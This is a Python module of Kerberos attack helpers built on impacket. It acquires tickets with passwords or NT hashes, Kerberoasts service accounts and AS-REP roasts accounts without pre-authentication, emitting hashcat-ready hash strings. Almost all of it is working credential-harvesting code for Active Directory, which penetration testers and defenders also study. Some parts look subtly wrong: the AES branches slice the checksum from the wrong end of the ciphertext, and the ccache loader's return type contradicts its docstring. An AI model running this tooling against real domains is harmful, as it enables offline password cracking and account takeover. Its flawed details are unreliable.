"""Kerberos authentication helpers — TGT/TGS acquisition and hash extraction."""

from __future__ import annotations

import logging
import os
import struct
import tempfile
from typing import Any

log = logging.getLogger(__name__)


# ── TGT acquisition ───────────────────────────────────────────────────────────

def get_tgt(
    username: str,
    domain: str,
    dc: str,
    *,
    password: str = "",
    lmhash: str = "",
    nthash: str = "",
    aes_key: str = "",
) -> tuple:
    """Acquire a Kerberos TGT using impacket.

    Returns (tgt_bytes, cipher, old_session_key, session_key).
    """
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket.krb5.types import Principal
    from impacket.krb5 import constants

    client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    lm = bytes.fromhex(lmhash) if lmhash else b""
    nt = bytes.fromhex(nthash) if nthash else b""

    return getKerberosTGT(
        client,
        password,
        domain,
        lm,
        nt,
        aes_key,
        dc,
    )


def get_tgt_from_ccache(ccache_path: str | None = None) -> tuple:
    """Load a TGT from a ccache file (or KRB5CCNAME env var).

    Returns (tgt_bytes, cipher, old_session_key, session_key).
    """
    from impacket.krb5.ccache import CCache
    from impacket.krb5.kerberosv5 import getKerberosTGT

    path = ccache_path or os.environ.get("KRB5CCNAME")
    if not path:
        raise ValueError("No ccache path provided and KRB5CCNAME not set")

    cc = CCache.loadFile(path)
    return cc.credentials[0].toImpacket()


# ── TGS acquisition ───────────────────────────────────────────────────────────

def get_tgs(
    tgt: bytes,
    cipher,
    session_key,
    spn: str,
    domain: str,
    dc: str,
) -> tuple:
    """Request a TGS for a given SPN.

    Returns (tgs_bytes, cipher, old_session_key, session_key).
    """
    from impacket.krb5.kerberosv5 import getKerberosTGS
    from impacket.krb5.types import Principal
    from impacket.krb5 import constants

    server = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
    return getKerberosTGS(server, domain, dc, tgt, cipher, session_key)


# ── Kerberoast hash extraction ────────────────────────────────────────────────

def tgs_to_hashcat(tgs: bytes, username: str, domain: str, spn: str) -> str:
    """Extract the crackable hash from a TGS ticket in hashcat format.

    Supports RC4 (etype 23) and AES128/256 (etype 17/18).
    """
    from pyasn1.codec.der import decoder
    from impacket.krb5.asn1 import TGS_REP

    decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    enc_part  = decoded["ticket"]["enc-part"]
    etype     = int(enc_part["etype"])
    ciphertext = bytes(enc_part["cipher"])

    spn_safe = spn.replace("*", "")

    if etype == 23:  # RC4-HMAC
        # First 16 bytes = HMAC checksum, rest = encrypted data
        checksum = ciphertext[:16].hex()
        data     = ciphertext[16:].hex()
        return f"$krb5tgs$23$*{username}${domain}${spn_safe}*${checksum}${data}"
    elif etype in (17, 18):  # AES128 / AES256
        # First 12 bytes = checksum
        checksum = ciphertext[:12].hex()
        data     = ciphertext[12:].hex()
        return f"$krb5tgs${etype}$*{username}${domain}${spn_safe}*${checksum}${data}"
    else:
        raise ValueError(f"Unsupported etype {etype} for Kerberoast hash extraction")


# ── AS-REP hash extraction ────────────────────────────────────────────────────

def request_as_rep(username: str, domain: str, dc: str) -> bytes:
    """Send an AS-REQ without pre-authentication and return the raw AS-REP bytes.

    Only works if the account has DONT_REQUIRE_PREAUTH set.
    """
    from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, seq_set, seq_set_iter
    from impacket.krb5.kerberosv5 import sendReceive
    from impacket.krb5.types import KerberosTime, Principal
    from impacket.krb5 import constants
    from pyasn1.type.univ import noValue
    import datetime

    client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    server = Principal(
        f"krbtgt/{domain.upper()}",
        type=constants.PrincipalNameType.NT_SRV_INST.value,
    )

    req = AS_REQ()
    req["pvno"]     = 5
    req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

    req_body = seq_set(req, "req-body")
    opts = constants.encodeFlags(())
    req_body["kdc-options"] = opts
    seq_set(req_body, "cname", client.components_to_asn1)
    req_body["realm"] = domain.upper()
    seq_set(req_body, "sname", server.components_to_asn1)

    now = datetime.datetime.now(datetime.timezone.utc)
    req_body["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["rtime"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["nonce"] = int.from_bytes(os.urandom(4), "big")
    seq_set_iter(req_body, "etype", [int(constants.EncryptionTypes.rc4_hmac.value)])

    # No PA-DATA = no pre-auth
    req["padata"] = noValue

    return sendReceive(req.getData(), domain, dc)


def as_rep_to_hashcat(as_rep_bytes: bytes, username: str, domain: str) -> str:
    """Extract the crackable hash from an AS-REP in hashcat format ($krb5asrep$23$...)."""
    from pyasn1.codec.der import decoder
    from impacket.krb5.asn1 import AS_REP

    decoded = decoder.decode(as_rep_bytes, asn1Spec=AS_REP())[0]
    enc_part  = decoded["enc-part"]
    etype     = int(enc_part["etype"])
    ciphertext = bytes(enc_part["cipher"])

    if etype == 23:  # RC4-HMAC
        checksum = ciphertext[:16].hex()
        data     = ciphertext[16:].hex()
        return f"$krb5asrep$23${username}@{domain}:{checksum}${data}"
    elif etype in (17, 18):
        checksum = ciphertext[:12].hex()
        data     = ciphertext[12:].hex()
        return f"$krb5asrep${etype}${username}@{domain}:{checksum}${data}"
    else:
        raise ValueError(f"Unsupported etype {etype} for AS-REP hash extraction")


# ── ccache helpers ────────────────────────────────────────────────────────────

def save_tgt_to_ccache(tgt: bytes, domain: str, username: str) -> str:
    """Save a TGT to a ccache file and return the path."""
    from impacket.krb5.ccache import CCache
    from impacket.krb5.types import Principal
    from impacket.krb5 import constants

    ccache = CCache()
    ccache.fromTGT(tgt, Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value), domain)
    path = tempfile.mktemp(suffix=".ccache")
    ccache.saveFile(path)
    return path
